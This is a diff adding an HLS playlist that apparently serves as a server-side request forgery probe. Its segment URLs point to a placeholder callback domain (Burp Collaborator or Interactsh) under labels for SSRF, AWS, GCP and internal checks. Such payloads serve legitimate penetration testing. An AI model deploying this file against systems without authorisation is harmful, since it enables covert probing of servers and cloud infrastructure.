@@ -1,0 +1,14 @@
+#EXTM3U
+#EXT-X-VERSION:3
+#EXT-X-MEDIA-SEQUENCE:0
+#EXT-X-TARGETDURATION:10
+# Replace CALLBACK_DOMAIN with your Burp Collaborator or Interactsh domain
+#EXTINF:10.0,
+http://ssrf-test.CALLBACK_DOMAIN/video.ts
+#EXTINF:10.0,
+http://aws-check.CALLBACK_DOMAIN/video.ts
+#EXTINF:10.0,
+http://gcp-check.CALLBACK_DOMAIN/video.ts
+#EXTINF:10.0,
+http://internal-check.CALLBACK_DOMAIN/video.ts
+#EXT-X-ENDLIST
